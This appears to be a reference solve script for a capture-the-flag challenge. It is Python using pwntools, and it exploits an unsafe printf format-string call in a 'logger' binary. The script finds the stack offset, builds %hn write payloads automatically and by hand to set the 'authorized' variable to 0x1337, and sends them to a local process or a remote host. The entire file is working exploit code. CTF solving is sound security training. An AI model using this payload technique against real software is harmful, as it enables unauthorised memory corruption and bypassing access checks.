#!/usr/bin/env python3
"""
Reference exploit for "printf Is Not Your Friend" CTF challenge.
Vulnerability: Unsafe format-string call in printf(log_entry).
Target: Overwrite global variable `authorized` with 0x1337 using %hn.

Usage:
    Local execution (default):
        python3 solve.py
        python3 solve.py /path/to/logger

    Remote execution:
        python3 solve.py <HOST> <PORT>
"""

import sys
import os
from pwn import (
    context,
    ELF,
    process,
    remote,
    p64,
    fmtstr_payload,
    log
)

# Configure architecture context
context.clear(arch="amd64")
context.log_level = "info"

MAGIC_AUTH = 0x1337


def locate_binary():
    """Find the target ELF binary locally."""
    # Check if a custom binary path was passed as an argument
    if len(sys.argv) == 2 and os.path.isfile(sys.argv[1]):
        return os.path.abspath(sys.argv[1])

    candidates = [
        "../challenge/logger",
        "./logger",
        "../dist/logger",
        "challenge/logger",
        "dist/logger",
    ]
    for path in candidates:
        if os.path.isfile(path) and os.access(path, os.X_OK):
            return os.path.abspath(path)
    return None


def discover_format_string_offset(bin_path):
    """
    Dynamically discover the argument offset of our input buffer
    by sending an 8-byte known marker and scanning stack positions.
    """
    log.info("Probing format string argument offset...")
    marker = b"AAAAAAAA"  # 8 bytes of 'A' -> 0x4141414141414141
    for offset in range(1, 25):
        try:
            p = process(bin_path, cwd=os.path.dirname(bin_path), level="error")
            p.sendlineafter(b"> ", marker + f"%{offset}$p".encode())
            output = p.recvall(timeout=1)
            p.close()
            if b"0x4141414141414141" in output:
                log.success(f"Discovered format string buffer offset: {offset}")
                return offset
        except Exception as e:
            continue
    log.warning("Dynamic offset discovery failed; defaulting to verified offset 6.")
    return 6


def build_manual_payload(offset, target_addr, target_value):
    """
    Constructs a manual %hn format-string payload.
    - Write value: target_value (0x1337 = 4919)
    - Specifier: %4919c%{addr_offset}$hn
    - Padding to maintain 8-byte alignment
    - Target 64-bit address placed at addr_offset
    """
    # Offset of the format string is `offset`.
    # Let's align the address:
    # "%4919c%X$hn" takes 11 bytes if X is a single digit.
    # To place the address on an 8-byte boundary:
    # 16 bytes for format specifier + padding, meaning the address will be at offset + 2.
    addr_offset = offset + 2
    specifier = f"%{target_value}c%{addr_offset}$hn".encode()
    pad_len = 16 - len(specifier)
    assert pad_len >= 0, "Specifier length exceeds 16 bytes"
    padding = b"A" * pad_len
    payload = specifier + padding + p64(target_addr)
    return payload


def main():
    remote_mode = False
    host = None
    port = None

    if len(sys.argv) == 3:
        # Remote mode: python3 solve.py <HOST> <PORT>
        remote_mode = True
        host = sys.argv[1]
        try:
            port = int(sys.argv[2])
        except ValueError:
            log.error("Port must be an integer.")
            sys.exit(1)

    bin_path = locate_binary()
    if not bin_path:
        log.error("Could not locate challenge binary 'logger'. Please run 'make' in challenge/ first.")
        sys.exit(1)

    log.info(f"Target binary: {bin_path}")
    elf = ELF(bin_path, checksec=True)

    # Stage 1: Identify address of 'authorized'
    if "authorized" not in elf.symbols:
        log.error("Symbol 'authorized' not found in binary.")
        sys.exit(1)

    target_addr = elf.symbols["authorized"]
    log.info(f"Symbol 'authorized' located at: {hex(target_addr)}")

    # Stage 2: Discover/Verify format string offset
    offset = discover_format_string_offset(bin_path)

    # Stage 3: Construct payload
    # Method A: Using pwntools fmtstr_payload
    payload_pwntools = fmtstr_payload(offset, {target_addr: MAGIC_AUTH}, write_size="short")
    log.info(f"Generated pwntools payload (len={len(payload_pwntools)}): {repr(payload_pwntools)}")

    # Method B: Manual payload (verified equivalent)
    payload_manual = build_manual_payload(offset, target_addr, MAGIC_AUTH)
    log.info(f"Generated manual %hn payload (len={len(payload_manual)}): {repr(payload_manual)}")

    # We use payload_pwntools as primary, verified to fit within 256 bytes
    chosen_payload = payload_pwntools

    # Stage 4: Launch target and deliver payload
    if remote_mode:
        log.info(f"Connecting to remote target {host}:{port}...")
        io = remote(host, port)
    else:
        log.info("Launching local process...")
        io = process(bin_path, cwd=os.path.dirname(bin_path))

    log.info("Awaiting prompt and sending payload...")
    io.sendlineafter(b"> ", chosen_payload)

    # Stage 5: Collect output and parse flag
    raw_output = io.recvall(timeout=3)
    io.close()

    output_text = raw_output.decode(errors="replace")
    log.info("--- Program Output ---")
    print(output_text)
    log.info("----------------------")

    # Stage 6: Validation
    if "FLAG:" in output_text or "kernel{" in output_text or "kctf{" in output_text:
        # Extract flag string
        for line in output_text.splitlines():
            if "FLAG:" in line or "kernel{" in line or "kctf{" in line:
                log.success(f"Flag captured: {line.strip()}")
        sys.exit(0)
    elif "Authorization check passed" in output_text:
        log.warning("Authorization succeeded (0x1337 written), but flag was not printed.")
        log.warning("Ensure flag.txt exists in the working directory.")
        sys.exit(0)
    else:
        log.error("Exploitation failed: 'authorized' was not modified to 0x1337.")
        sys.exit(1)


if __name__ == "__main__":
    main()
